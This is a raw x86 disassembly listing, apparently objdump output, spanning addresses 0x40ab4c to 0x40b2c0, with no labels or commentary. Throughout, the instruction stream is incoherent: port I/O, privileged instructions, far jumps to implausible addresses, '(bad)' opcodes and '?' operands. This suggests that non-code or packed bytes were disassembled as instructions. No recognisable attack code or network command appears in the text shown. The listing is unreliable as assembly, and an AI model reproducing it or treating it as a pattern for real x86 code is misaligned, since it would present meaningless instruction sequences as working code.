  40ab4c:	in     eax,dx
  40ab4d:	jns    0x40aba3
  40ab4f:	out    0xe2,al
  40ab51:	test   BYTE PTR [edx+0x2e],bh
  40ab54:	sbb    al,0xe8
  40ab57:	add    DWORD PTR [eax],eax
  40ab59:	ret    0xc9c4
  40ab5c:	inc    edx
  40ab5d:	dec    edi
  40ab5e:	test   eax,0xec6e8249
  40ab63:	imul   DWORD PTR [esi]
  40ab65:	pop    ecx
  40ab66:	xlat   BYTE PTR ds:[ebx]
  40ab67:	push   esi
  40ab68:	aaa    
  40ab69:	jecxz  0x40aafa
  40ab6b:	dec    BYTE PTR [esi+0x6c]
  40ab6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab6f:	inc    ecx
  40ab70:	mov    ss,WORD PTR [ebp-0x56]
  40ab73:	arpl   WORD PTR [esi-0x1c0eb7d],bx
  40ab79:	adc    DWORD PTR [ebx-0x3af04ef7],0x423029c9
  40ab83:	mov    ds:0xa992fec5,al
  40ab88:	and    ah,ch
  40ab8a:	neg    BYTE PTR [ebx]
  40ab8c:	aad    0x14
  40ab8e:	daa    
  40ab8f:	clc    
  40ab90:	xchg   edi,eax
  40ab91:	aad    0xfd
  40ab93:	sub    eax,DWORD PTR [edi]
  40ab95:	push   ebp
  40ab96:	and    DWORD PTR [ebx-0x2],ebx
  40ab99:	inc    ebp
  40ab9a:	cli    
  40ab9b:	mov    bh,0xae
  40ab9d:	(bad)  
  40ab9e:	jmp    0x40ab89
  40aba0:	imul   eax,DWORD PTR [edx+0x6099c14c],0xffffff96
  40aba7:	cdq    
  40aba8:	dec    esp
  40aba9:	aam    0x95
  40abab:	lods   eax,DWORD PTR ds:[esi]
  40abac:	push   edx
  40abad:	sub    eax,0xb55d2f0b
  40abb2:	xlat   BYTE PTR ds:[ebx]
  40abb3:	push   ds
  40abb4:	cmp    ch,cl
  40abb6:	xchg   ch,bh
  40abb8:	push   edi
  40abb9:	in     al,0x1b
  40abbb:	pusha  
  40abbc:	sub    DWORD PTR [edi],0x3f6bc778
  40abc2:	push   0x56
  40abc4:	mov    ?,WORD PTR [edx+0x66e0af04]
  40abca:	xchg   BYTE PTR [edi],ch
  40abcc:	imul   DWORD PTR [edi-0x44]
  40abcf:	pop    ebp
  40abd0:	ss jle 0x40abc2
  40abd3:	shl    ch,cl
  40abd5:	mov    ds:0xb65acb87,al
  40abda:	mov    esi,0x588bab02
  40abdf:	ret    
  40abe0:	and    eax,0x347324d
  40abe5:	out    0xd5,eax
  40abe7:	or     DWORD PTR [ecx+0x7ea1c9ff],edx
  40abed:	add    eax,DWORD PTR [ecx-0x6e413984]
  40abf3:	std    
  40abf4:	addr16 mov eax,ds:0xa0e4
  40abf8:	sub    ah,dh
  40abfa:	mov    ecx,0x3b848585
  40abff:	pusha  
  40ac00:	push   esp
  40ac01:	fs cli 
  40ac03:	das    
  40ac04:	adc    DWORD PTR [eax+0x7],edi
  40ac07:	cmp    BYTE PTR [ecx-0x68],dh
  40ac0a:	aad    0x9c
  40ac0c:	mov    BYTE PTR [esi+0x192db2fe],cl
  40ac12:	ss and eax,0xb2a90f3a
  40ac18:	push   edi
  40ac19:	mov    esp,DWORD PTR [esi+0x14]
  40ac1c:	dec    ecx
  40ac1d:	outs   dx,DWORD PTR ds:[esi]
  40ac1e:	xor    BYTE PTR [ebx+0x1a],ch
  40ac21:	inc    esi
  40ac22:	mov    ebp,DWORD PTR [edi+0x64f22da8]
  40ac28:	mov    BYTE PTR [edx],ch
  40ac2a:	cmp    BYTE PTR [ebx-0x4a89e039],dl
  40ac30:	clc    
  40ac31:	rcl    DWORD PTR [eax+ecx*8+0x109c889c],cl
  40ac38:	inc    ebx
  40ac39:	mov    ebx,0x4bb48b95
  40ac3e:	pop    eax
  40ac3f:	dec    edi
  40ac40:	cmp    eax,0xdea47bc3
  40ac45:	mov    al,ds:0x1467b389
  40ac4a:	ror    DWORD PTR [esi],0x67
  40ac4d:	mov    bh,0x55
  40ac4f:	in     al,0x2
  40ac51:	add    esp,ebx
  40ac53:	push   ss
  40ac54:	push   es
  40ac55:	iret   
  40ac56:	cmp    eax,0x1f8e1a8d
  40ac5b:	xor    ebx,DWORD PTR [eax]
  40ac5d:	lea    edi,[ecx]
  40ac5f:	mov    ecx,0xc1f6612f
  40ac64:	ja     0x40acab
  40ac66:	jmp    0x40abf1
  40ac68:	xchg   ebp,eax
  40ac69:	aad    0x70
  40ac6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac6c:	push   edi
  40ac6d:	xchg   DWORD PTR [ebp-0x23],ebx
  40ac70:	xchg   ecx,eax
  40ac71:	and    bl,bl
  40ac73:	or     BYTE PTR [edx-0x75],dh
  40ac76:	sbb    BYTE PTR [edi+0x1e],0x77
  40ac7a:	mov    WORD PTR [ecx-0x462064c],gs
  40ac80:	dec    edx
  40ac81:	xchg   ebp,ecx
  40ac83:	jns    0x40ac48
  40ac85:	ror    al,0x3c
  40ac88:	aaa    
  40ac89:	inc    edi
  40ac8a:	add    al,0xd9
  40ac8c:	dec    edi
  40ac8d:	pop    ds
  40ac8e:	and    eax,0x74354f26
  40ac93:	aas    
  40ac94:	xchg   esp,eax
  40ac95:	cmp    DWORD PTR [eax-0x11],edi
  40ac98:	sar    BYTE PTR [edx],1
  40ac9a:	sbb    eax,0x42e93597
  40ac9f:	inc    eax
  40aca0:	scas   eax,DWORD PTR es:[edi]
  40aca1:	test   eax,0xca1d151f
  40aca6:	aam    0x7e
  40aca8:	push   ds
  40aca9:	xor    eax,0xd7135535
  40acae:	retf   0xd96c
  40acb1:	lods   al,BYTE PTR ds:[esi]
  40acb2:	pop    eax
  40acb3:	fidiv  WORD PTR [esi*4+0x7a7cbe2]
  40acba:	sbb    ecx,DWORD PTR [ecx-0x2e]
  40acbd:	pop    ds
  40acbe:	stos   DWORD PTR es:[edi],eax
  40acbf:	lea    ebx,[edi-0x223f10d7]
  40acc5:	shr    BYTE PTR [ebp+0x6b28dbaf],1
  40accb:	idiv   DWORD PTR [edi]
  40accd:	cmp    dh,BYTE PTR ds:0x65098939
  40acd3:	lea    esp,[eax+0xc]
  40acd6:	sub    BYTE PTR [edi+0x1d],ch
  40acd9:	push   ebp
  40acda:	mov    dh,0x40
  40acdc:	call   0xf699e0f2
  40ace1:	cwde   
  40ace2:	into   
  40ace3:	push   ecx
  40ace4:	xchg   ebx,eax
  40ace5:	sub    edi,edx
  40ace7:	hlt    
  40ace8:	ret    
  40ace9:	(bad)  
  40acea:	call   0x37ba6de7
  40acef:	lds    esi,FWORD PTR ds:0xf0bc
  40acf4:	mov    DWORD PTR [edi-0x756304e9],esi
  40acfa:	ins    BYTE PTR es:[edi],dx
  40acfb:	fisubr WORD PTR [esi]
  40acfd:	push   esp
  40acfe:	inc    ebx
  40acff:	pop    es
  40ad00:	in     al,dx
  40ad01:	mov    bh,0x61
  40ad03:	sbb    al,0x17
  40ad05:	and    eax,0x59869860
  40ad0a:	bnd je 0x40ad84
  40ad0d:	sub    ah,ch
  40ad0f:	dec    eax
  40ad10:	and    eax,DWORD PTR [ecx-0x72c54752]
  40ad16:	cli    
  40ad17:	push   0xde8f0ea1
  40ad1c:	push   ebp
  40ad1d:	hlt    
  40ad1e:	fwait
  40ad1f:	lods   eax,DWORD PTR ds:[esi]
  40ad20:	cmp    BYTE PTR [ecx],ch
  40ad22:	cmp    eax,0x1c688ad
  40ad27:	or     BYTE PTR [edx],dh
  40ad29:	mov    edi,0xb6fa6585
  40ad2e:	ret    0xf8c9
  40ad31:	sub    BYTE PTR [edi],0xab
  40ad34:	cld    
  40ad35:	push   edx
  40ad36:	pop    esi
  40ad37:	ins    DWORD PTR es:[edi],dx
  40ad38:	pop    esp
  40ad39:	sbb    BYTE PTR [ebx-0x16],ch
  40ad3c:	sub    DWORD PTR [ebx+0xd],esi
  40ad3f:	xor    DWORD PTR [ebx-0x27],edx
  40ad42:	imul   ebp,DWORD PTR [eax-0x14],0xffffff81
  40ad46:	cmp    cl,BYTE PTR [edi*1-0x68db8be5]
  40ad4d:	lds    ebp,FWORD PTR [ecx+0x51]
  40ad50:	daa    
  40ad51:	enter  0x2659,0xc8
  40ad55:	call   0x943a:0x8bd791b1
  40ad5c:	ja     0x40ad6b
  40ad5e:	mov    fs,WORD PTR [edx]
  40ad60:	ss push 0x4ae15767
  40ad66:	sbb    al,0x5d
  40ad68:	adc    al,0x5a
  40ad6a:	lahf   
  40ad6b:	jae    0x40ada9
  40ad6d:	mov    DWORD PTR [edx+0x60],edi
  40ad70:	sbb    DWORD PTR [esi+0x6a],edx
  40ad73:	jno    0x40adf3
  40ad75:	shl    BYTE PTR [ebp+ecx*1-0x43],1
  40ad79:	xor    eax,0xe3140ddd
  40ad7e:	fld    QWORD PTR [ebx-0x3dd0c0b7]
  40ad84:	push   ebx
  40ad85:	cs mov dl,0x8c
  40ad88:	sub    DWORD PTR [esi-0x66],edi
  40ad8b:	rcl    DWORD PTR [ecx+0x34],cl
  40ad8e:	pop    esi
  40ad8f:	aam    0xe2
  40ad91:	sub    bl,BYTE PTR [edx-0x2e61ce1c]
  40ad97:	pop    ss
  40ad98:	add    BYTE PTR [ecx],bh
  40ad9a:	std    
  40ad9b:	in     eax,dx
  40ad9c:	push   ecx
  40ad9d:	dec    esp
  40ad9e:	push   ds
  40ad9f:	lods   eax,DWORD PTR ds:[esi]
  40ada0:	fsubr  st,st(0)
  40ada2:	dec    edx
  40ada3:	stos   BYTE PTR es:[edi],al
  40ada4:	int3   
  40ada5:	sub    eax,0x4d832eca
  40adaa:	pop    edx
  40adab:	xchg   ebx,eax
  40adac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40adad:	ds ds xchg ebx,eax
  40adb0:	push   0x3f
  40adb2:	xchg   edx,eax
  40adb3:	scas   eax,DWORD PTR es:[edi]
  40adb4:	(bad)  
  40adb5:	sbb    DWORD PTR [edx+0xe209bdb],eax
  40adbb:	adc    al,cl
  40adbd:	inc    edx
  40adbe:	mov    ecx,0x486810c0
  40adc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adc4:	adc    al,0xb7
  40adc6:	push   ds
  40adc7:	aad    0xd3
  40adc9:	cs adc eax,0xd4391ef1
  40adcf:	xor    DWORD PTR [ebx-0x5c],edx
  40add2:	rol    cl,1
  40add4:	lea    esp,[edx+eax*4+0x73]
  40add8:	call   0x3e1:0x8f5e5fa4
  40addf:	push   ebp
  40ade0:	sub    dh,BYTE PTR [ebp+0x2ff71ef7]
  40ade6:	mov    al,ds:0x39ef96d2
  40adeb:	sahf   
  40adec:	out    0xf,eax
  40adee:	out    dx,eax
  40adef:	aas    
  40adf0:	inc    ebp
  40adf1:	test   DWORD PTR [edi+0x4f38045e],0x9428d606
  40adfb:	adc    al,BYTE PTR [ebp+0x7b61253e]
  40ae01:	inc    esi
  40ae02:	or     eax,0x7e4a50da
  40ae07:	cmc    
  40ae08:	sub    DWORD PTR [ebx+0x22a12e44],edx
  40ae0e:	mov    dl,0xa1
  40ae10:	xor    al,0x99
  40ae12:	popf   
  40ae13:	xor    esi,ecx
  40ae15:	push   es
  40ae16:	out    dx,eax
  40ae17:	mov    dl,0x9c
  40ae19:	imul   ebx,ebp,0x6d
  40ae1c:	jl     0x40ae69
  40ae1e:	push   ebp
  40ae1f:	sub    DWORD PTR [eax+0x8],0xffffff98
  40ae23:	data16 loopne 0x40add6
  40ae26:	and    al,BYTE PTR [edx+eax*2+0x2e]
  40ae2a:	xchg   esi,eax
  40ae2b:	dec    ecx
  40ae2c:	cmp    ah,BYTE PTR [ebx+0x1a2d98a3]
  40ae32:	pop    es
  40ae33:	ret    0x615d
  40ae36:	jmp    0x740298a9
  40ae3b:	fbld   TBYTE PTR [edx-0x66e09b0]
  40ae41:	call   0xa866:0x7104b6ae
  40ae48:	in     al,0x6e
  40ae4a:	xor    edx,DWORD PTR [ecx+0x59]
  40ae4d:	mov    ds:0xd79d005b,eax
  40ae52:	mov    BYTE PTR [edx-0x3f],bh
  40ae55:	sbb    DWORD PTR [eax-0x5b136a01],ecx
  40ae5b:	test   ecx,esi
  40ae5d:	sbb    eax,0x7539571e
  40ae62:	popa   
  40ae63:	mov    bh,0x6b
  40ae65:	mov    WORD PTR [esi-0x45],fs
  40ae68:	ja     0x40ae6f
  40ae6a:	mov    edx,0x7b49a948
  40ae6f:	inc    edi
  40ae70:	add    dl,ch
  40ae72:	dec    esp
  40ae73:	(bad)  
  40ae75:	in     eax,dx
  40ae76:	xor    al,0x5a
  40ae78:	pushf  
  40ae79:	xchg   edi,eax
  40ae7a:	aaa    
  40ae7b:	retf   0x3f6f
  40ae7e:	push   edi
  40ae7f:	popa   
  40ae80:	dec    ebp
  40ae81:	les    ecx,FWORD PTR [ecx]
  40ae83:	daa    
  40ae84:	xor    DWORD PTR [edi+0xeab2f3f],edi
  40ae8a:	inc    ebp
  40ae8b:	xchg   edi,eax
  40ae8c:	leave  
  40ae8d:	pop    ds
  40ae8e:	ds jecxz 0x40ae17
  40ae91:	int3   
  40ae92:	test   eax,0x1fc6973
  40ae97:	sbb    esi,DWORD PTR [edx-0x12fc7686]
  40ae9d:	sub    DWORD PTR [edi+0x7f799b5b],ecx
  40aea3:	mov    ah,0x70
  40aea5:	sbb    bh,cl
  40aea7:	mov    ecx,ebx
  40aea9:	cmp    si,di
  40aeac:	mov    cl,0xe1
  40aeae:	jg     0x40ae52
  40aeb0:	sub    BYTE PTR [esp+ecx*2+0x42],0xac
  40aeb5:	dec    esi
  40aeb6:	js     0x40af2e
  40aeb8:	popa   
  40aeb9:	pop    ebp
  40aeba:	or     al,0xa3
  40aebc:	mov    edi,es
  40aebe:	(bad)  
  40aebf:	fld    DWORD PTR [ebx+eiz*8+0x3e]
  40aec3:	pop    edi
  40aec4:	mov    bh,0x31
  40aec6:	test   BYTE PTR [ecx+0xc],dl
  40aec9:	inc    ecx
  40aeca:	ins    BYTE PTR es:[edi],dx
  40aecb:	cmp    eax,0x629b17d9
  40aed0:	mov    es,ebx
  40aed2:	(bad)  
  40aed4:	xlat   BYTE PTR ds:[ebx]
  40aed5:	adc    bh,ch
  40aed7:	sub    eax,0xa62d4080
  40aedc:	loopne 0x40af2b
  40aede:	sbb    BYTE PTR [edx-0xd],al
  40aee1:	sbb    DWORD PTR cs:[edi+esi*2+0x3a],esi
  40aee6:	adc    al,0xf
  40aee8:	add    al,0x32
  40aeea:	fmul   DWORD PTR [esi]
  40aeec:	(bad)  
  40aeed:	out    0x5d,eax
  40aeef:	ret    
  40aef0:	data16 (bad) 
  40aef2:	aad    0x43
  40aef4:	in     eax,dx
  40aef5:	loop   0x40af07
  40aef7:	bound  ecx,QWORD PTR [ebx-0x19203085]
  40aefd:	xchg   ebx,eax
  40aefe:	jmp    0x40ae90
  40af00:	nop    DWORD PTR [edi-0x6b]
  40af04:	(bad)  
  40af05:	jge    0x40af08
  40af07:	push   es
  40af08:	mov    al,0x3d
  40af0a:	jmp    0xaf58:0xdbba3c5a
  40af11:	or     eax,0xf731ab7e
  40af16:	xor    DWORD PTR [edx-0x145c627c],edi
  40af1c:	xchg   edx,eax
  40af1d:	mov    ah,BYTE PTR [esi-0x7]
  40af20:	retf   
  40af21:	out    0x7b,al
  40af23:	in     eax,0xff
  40af25:	and    esi,esi
  40af27:	dec    eax
  40af28:	adc    al,0x80
  40af2a:	xchg   ebx,eax
  40af2b:	loope  0x40aeca
  40af2d:	fistp  WORD PTR [edx+0x7c394025]
  40af33:	out    dx,al
  40af34:	dec    eax
  40af35:	ds ins DWORD PTR es:[edi],dx
  40af37:	mov    ch,0x75
  40af39:	cmp    cl,0x3a
  40af3c:	rol    BYTE PTR ds:0xaf4b7d1d,1
  40af42:	sbb    bh,ah
  40af44:	inc    ecx
  40af45:	mov    ds:0x6e6bb69a,al
  40af4a:	daa    
  40af4b:	popf   
  40af4c:	scas   eax,DWORD PTR es:[edi]
  40af4d:	out    dx,eax
  40af4e:	js     0x40afcd
  40af50:	jg     0x40af72
  40af52:	inc    esi
  40af53:	mov    edi,0xb16e4021
  40af58:	push   es
  40af59:	pop    edi
  40af5a:	outs   dx,DWORD PTR ds:[esi]
  40af5b:	add    bl,dl
  40af5d:	push   0xffffffdd
  40af5f:	mov    ebp,0x17a53fad
  40af64:	push   edx
  40af65:	lea    eax,[edx-0x5f241e47]
  40af6b:	lods   eax,DWORD PTR ds:[esi]
  40af6c:	pop    ebx
  40af6d:	push   esi
  40af6e:	in     eax,0xa4
  40af70:	and    BYTE PTR [edx-0x63],0x73
  40af74:	xchg   edx,eax
  40af75:	retf   0xd299
  40af78:	pop    ecx
  40af79:	add    eax,0xdbf0d45b
  40af7e:	dec    eax
  40af7f:	int    0xc2
  40af81:	fldcw  WORD PTR [ebx-0x2bcfd4ac]
  40af87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af88:	push   ebp
  40af89:	in     eax,dx
  40af8a:	shl    BYTE PTR ds:0x950bb427,0x22
  40af91:	inc    ebx
  40af92:	push   edi
  40af93:	xchg   ecx,eax
  40af94:	es out 0xa3,eax
  40af97:	mov    WORD PTR [ebp-0x8],?
  40af9a:	in     eax,0xeb
  40af9c:	aad    0x42
  40af9e:	lock mov ds:0x2bd872c2,eax
  40afa4:	pop    edx
  40afa5:	or     DWORD PTR [ebx-0x76],esp
  40afa8:	sar    DWORD PTR [ebx+0x3e254dea],1
  40afae:	mov    bl,0xbc
  40afb0:	jle    0x40af48
  40afb2:	clc    
  40afb3:	cmp    edx,DWORD PTR [ebp-0x42]
  40afb6:	mul    al
  40afb8:	out    dx,eax
  40afb9:	cwde   
  40afba:	mov    DWORD PTR [ecx+ebp*1-0x6c7c0331],eax
  40afc1:	shl    DWORD PTR [edx-0x36],1
  40afc4:	sbb    DWORD PTR [ebp+0x7001985],eax
  40afca:	push   DWORD PTR [ecx+0x10]
  40afcd:	pop    ebp
  40afce:	mov    ?,WORD PTR ds:0xe6a5c779
  40afd4:	imul   edx,DWORD PTR [ebp-0x15b296dc],0xffffff86
  40afdb:	cwde   
  40afdc:	lds    ebp,FWORD PTR [edx]
  40afde:	fwait
  40afdf:	mov    DWORD PTR [ecx+esi*1+0x5d],edi
  40afe3:	div    DWORD PTR [ebp+0x2e]
  40afe6:	xchg   esi,eax
  40afe7:	mov    ebp,0x3ecede35
  40afec:	pop    ss
  40afed:	adc    DWORD PTR [esi],ebp
  40afef:	dec    edx
  40aff0:	scas   eax,DWORD PTR es:[edi]
  40aff1:	sbb    eax,0xb3bd19db
  40aff6:	enter  0x22f5,0x6
  40affa:	cmp    cl,BYTE PTR [edx+eiz*2-0x2692dde2]
  40b001:	pop    ecx
  40b002:	or     eax,0xc0438eec
  40b007:	das    
  40b008:	xor    eax,0xbb7d3fe1
  40b00d:	xchg   ecx,eax
  40b00e:	jl     0x40afdc
  40b010:	nop
  40b011:	dec    ecx
  40b012:	shl    BYTE PTR [edi-0x3c],0xcb
  40b016:	ss popa 
  40b018:	nop
  40b019:	shl    BYTE PTR [eax-0x7f8a92d7],1
  40b01f:	fist   DWORD PTR [esi]
  40b021:	ror    DWORD PTR [ecx+ebx*2],0xbc
  40b025:	lods   al,BYTE PTR ds:[esi]
  40b026:	inc    edx
  40b027:	or     al,0xa5
  40b029:	mov    ecx,0x51dd8a9b
  40b02e:	xchg   edx,eax
  40b02f:	dec    edi
  40b030:	je     0x40b039
  40b032:	mov    ecx,0x7422f1de
  40b037:	or     ah,BYTE PTR [esp+eiz*4+0x7c]
  40b03b:	inc    ecx
  40b03c:	adc    BYTE PTR [edx],bh
  40b03e:	push   eax
  40b03f:	ror    BYTE PTR [ebx],0x78
  40b042:	in     eax,0x77
  40b044:	push   esp
  40b045:	nop
  40b046:	add    al,0x96
  40b048:	cli    
  40b049:	data16 and al,0xc1
  40b04c:	cs sar dh,0x47
  40b050:	or     ecx,DWORD PTR [edi-0x4db03e2b]
  40b056:	xchg   edx,eax
  40b057:	sbb    DWORD PTR [ebx+0x57],0xffffffcd
  40b05b:	mov    ah,0x93
  40b05d:	mov    dh,0xe3
  40b05f:	mov    al,0x67
  40b061:	mov    esi,0x591b608e
  40b066:	stc    
  40b067:	fwait
  40b068:	mov    WORD PTR [esi],cs
  40b06a:	sbb    BYTE PTR [edi],al
  40b06c:	push   cs
  40b06d:	mov    eax,0xc3c82926
  40b072:	cmp    al,0x96
  40b074:	mov    ds:0xae2c52d8,eax
  40b079:	xor    BYTE PTR [esp+ebx*2-0x428d6301],0x56
  40b081:	loop   0x40b09a
  40b083:	mov    ds:0xe416a28f,eax
  40b088:	sbb    al,0x3a
  40b08a:	xlat   BYTE PTR ds:[ebx]
  40b08b:	ds js  0x40b09b
  40b08e:	push   cs
  40b08f:	loope  0x40b0ed
  40b091:	xchg   bl,dh
  40b093:	or     DWORD PTR [ecx],esp
  40b095:	jo     0x40b091
  40b097:	mov    esi,0x6889ff19
  40b09c:	fs das 
  40b09e:	(bad)  
  40b09f:	aaa    
  40b0a0:	push   ecx
  40b0a1:	data16 in al,0xd7
  40b0a4:	call   DWORD PTR [ebp-0x6eedf6a4]
  40b0aa:	dec    ecx
  40b0ab:	test   DWORD PTR [esi+0x672bc272],edi
  40b0b1:	ins    DWORD PTR es:[edi],dx
  40b0b2:	inc    edx
  40b0b3:	cdq    
  40b0b4:	daa    
  40b0b5:	push   eax
  40b0b6:	in     al,0x49
  40b0b8:	out    0x3a,al
  40b0ba:	aam    0x70
  40b0bc:	dec    ebp
  40b0bd:	mov    dh,0x34
  40b0bf:	mov    edx,0x8b4e55b7
  40b0c4:	jne    0x40b0ec
  40b0c6:	push   cs
  40b0c7:	and    eax,0x9bcf8978
  40b0cc:	daa    
  40b0cd:	mul    BYTE PTR [esi]
  40b0cf:	arpl   bp,bx
  40b0d1:	shl    BYTE PTR [esi+0x23],cl
  40b0d4:	lods   al,BYTE PTR ds:[esi]
  40b0d5:	in     eax,0xbc
  40b0d7:	arpl   WORD PTR [edi+eax*4],bx
  40b0da:	xchg   esp,eax
  40b0db:	pop    ebx
  40b0dc:	cli    
  40b0dd:	mov    bl,0x6f
  40b0df:	push   0xe
  40b0e1:	xor    al,0x19
  40b0e3:	mov    DWORD PTR [ecx-0x37],ebp
  40b0e6:	in     al,0x59
  40b0e8:	sbb    eax,0x511570f2
  40b0ed:	data16 std 
  40b0ef:	dec    edx
  40b0f0:	in     al,dx
  40b0f1:	popf   
  40b0f2:	mov    esi,es
  40b0f4:	mov    ds:0x27a4eaee,al
  40b0f9:	in     eax,0x47
  40b0fb:	inc    ebp
  40b0fc:	jl     0x40b0a7
  40b0fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0ff:	sub    BYTE PTR [ebp-0x20],cl
  40b102:	bnd jg 0x40b179
  40b105:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b106:	daa    
  40b107:	jmp    0xed3e:0x3b7a5923
  40b10e:	sbb    DWORD PTR [edx],ebx
  40b110:	in     eax,dx
  40b111:	test   BYTE PTR ds:0x190d73bd,bh
  40b117:	test   eax,0x7d5ca540
  40b11c:	mov    cl,BYTE PTR [edi+0x1a]
  40b11f:	les    esp,FWORD PTR [edx-0x42]
  40b122:	clc    
  40b123:	cdq    
  40b124:	mov    edx,0x6544c896
  40b129:	ret    0xc5ea
  40b12c:	adc    DWORD PTR [ecx],esi
  40b12e:	addr16 jmp 0x3d7e:0xb07885e2
  40b136:	mov    dh,0x86
  40b138:	mov    cs,WORD PTR [ebx+ebp*8]
  40b13b:	push   ebp
  40b13c:	neg    BYTE PTR [ebx+0x3f4aff2d]
  40b142:	xor    DWORD PTR [ecx+0x6c],esp
  40b145:	mov    WORD PTR [edi],?
  40b147:	mov    edx,0xaf615d8
  40b14c:	or     cl,ah
  40b14e:	jecxz  0x40b12c
  40b150:	mov    ch,0x3f
  40b152:	std    
  40b153:	jp     0x40b0f5
  40b155:	aaa    
  40b156:	xchg   edx,eax
  40b157:	and    ecx,ebx
  40b159:	ficomp DWORD PTR [ebx+eax*8]
  40b15c:	adc    BYTE PTR [eax+ecx*4+0x7f4ae51d],0x91
  40b164:	push   ebp
  40b165:	outs   dx,DWORD PTR ds:[esi]
  40b166:	adc    eax,0x5a48c29a
  40b16b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b16c:	adc    eax,0x1ce775a1
  40b171:	mov    cl,0xe3
  40b173:	pop    edx
  40b174:	mov    ?,WORD PTR [ebx-0x4f]
  40b177:	(bad)  
  40b179:	add    esp,DWORD PTR [ebx+edi*2]
  40b17c:	pop    ecx
  40b17d:	adc    BYTE PTR [edx+0x41069a93],ah
  40b183:	mov    bh,0x29
  40b185:	(bad)  
  40b186:	ret    0x442b
  40b189:	or     BYTE PTR [edx-0x6b],al
  40b18c:	xor    BYTE PTR [eax+0x6c579d2f],bl
  40b192:	inc    esp
  40b193:	stos   DWORD PTR es:[edi],eax
  40b194:	or     dl,BYTE PTR [ebx+0x65]
  40b197:	sub    ebp,DWORD PTR [ebp+0x83dd3b4]
  40b19d:	sub    BYTE PTR [edi],dh
  40b19f:	dec    ecx
  40b1a0:	xor    DWORD PTR [esi+0x1e],edx
  40b1a3:	sub    eax,0x5cf14476
  40b1a8:	data16 jl 0x40b1db
  40b1ab:	std    
  40b1ac:	jb     0x40b200
  40b1ae:	cwde   
  40b1af:	inc    edx
  40b1b0:	or     DWORD PTR [edi+0xaa5c080],ebx
  40b1b6:	cli    
  40b1b7:	dec    eax
  40b1b8:	jmp    0xf7fcc29e
  40b1bd:	(bad)  [eax-0x2ce942ad]
  40b1c3:	add    ebx,edi
  40b1c5:	mov    esp,0xfc2c6da3
  40b1ca:	and    bh,dl
  40b1cc:	cmp    DWORD PTR [esi-0x5f4348a7],eax
  40b1d2:	mov    cl,0xc2
  40b1d4:	xchg   ecx,eax
  40b1d5:	out    0xe6,al
  40b1d7:	bound  ecx,QWORD PTR [esi]
  40b1d9:	sub    eax,0x86ace82
  40b1de:	fst    st(5)
  40b1e0:	push   ebp
  40b1e1:	pop    es
  40b1e2:	inc    ebx
  40b1e3:	(bad)  
  40b1e4:	dec    esi
  40b1e5:	hlt    
  40b1e6:	test   al,0x56
  40b1e8:	daa    
  40b1e9:	ret    
  40b1ea:	out    0xc1,eax
  40b1ec:	mov    ah,0x91
  40b1ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1ef:	test   BYTE PTR [ecx],ah
  40b1f1:	inc    ecx
  40b1f2:	adc    BYTE PTR [ebx-0x25],bh
  40b1f5:	clc    
  40b1f6:	ins    BYTE PTR es:[edi],dx
  40b1f7:	retf   0x5069
  40b1fa:	iret   
  40b1fb:	mov    DWORD PTR [ecx-0x31382e30],ecx
  40b201:	dec    ecx
  40b202:	jmp    0xebba71c
  40b207:	out    0x60,al
  40b209:	rcl    BYTE PTR [ebp-0x69],cl
  40b20c:	(bad)  
  40b20d:	cmp    ebp,edx
  40b20f:	mov    al,0x41
  40b211:	rcr    ebx,cl
  40b213:	add    al,0x63
  40b215:	push   ebp
  40b217:	xor    esp,eax
  40b219:	int    0xfa
  40b21b:	aas    
  40b21c:	sub    BYTE PTR [edx+ebx*8-0x80],al
  40b220:	div    DWORD PTR [bx-0x3e]
  40b224:	xlat   BYTE PTR ds:[ebx]
  40b225:	xchg   BYTE PTR [ecx+0x3a],al
  40b228:	cmp    DWORD PTR [esi-0x2c],0xffffff8f
  40b22c:	pop    ds
  40b22d:	adc    eax,0xf9c36ec5
  40b232:	cmp    BYTE PTR [edx+0x6a],0x6e
  40b236:	pop    ebx
  40b237:	fist   DWORD PTR ds:0xe0532e1e
  40b23e:	int    0xc8
  40b240:	ja     0x40b259
  40b242:	or     ah,dl
  40b244:	cld    
  40b245:	test   al,0xe9
  40b247:	repnz daa 
  40b249:	aaa    
  40b24a:	data16 std 
  40b24c:	fs xchg ebx,eax
  40b24e:	jecxz  0x40b258
  40b250:	push   0xaf9b9f5b
  40b255:	jae    0x40b28e
  40b257:	fidivr DWORD PTR [edi-0x42]
  40b25a:	pushf  
  40b25b:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b25d:	push   edx
  40b25e:	add    BYTE PTR [eax+0x76af9c92],bl
  40b264:	push   edx
  40b265:	pop    ebx
  40b266:	fsub   DWORD PTR [eax]
  40b268:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b269:	clc    
  40b26a:	(bad)
  40b26e:	push   ds
  40b26f:	lahf   
  40b270:	bound  eax,QWORD PTR [eax+0x316c2fb6]
  40b276:	mov    ah,BYTE PTR [esi+edx*1+0x335bd5da]
  40b27d:	lods   eax,DWORD PTR ds:[esi]
  40b27e:	mov    ch,0xfb
  40b280:	adc    al,0xc9
  40b282:	push   esp
  40b283:	lods   al,BYTE PTR ds:[esi]
  40b284:	add    ah,ah
  40b286:	out    0x9f,eax
  40b288:	jl     0x40b29c
  40b28a:	add    eax,0x3b51bd0f
  40b28f:	fbld   TBYTE PTR [edi-0x11bbf006]
  40b295:	dec    ebp
  40b296:	adc    BYTE PTR [eax+0x13cbf7b4],al
  40b29c:	mov    edi,0x966809f0
  40b2a1:	neg    BYTE PTR [edi+eax*4]
  40b2a4:	popa   
  40b2a5:	mov    ebp,0xd70a9d11
  40b2aa:	popf   
  40b2ab:	adc    ch,ah
  40b2ad:	ds call 0xe3c2:0xaced27e3
  40b2b5:	sbb    BYTE PTR [ebx],bl
  40b2b7:	ins    BYTE PTR es:[edi],dx
  40b2b8:	fstp   st(6)
  40b2ba:	fsub   st,st(1)
  40b2bc:	sti    
  40b2bd:	or     ebp,esp
  40b2bf:	aas    
  40b2c0:	mov    ds:0xc36b6028,al
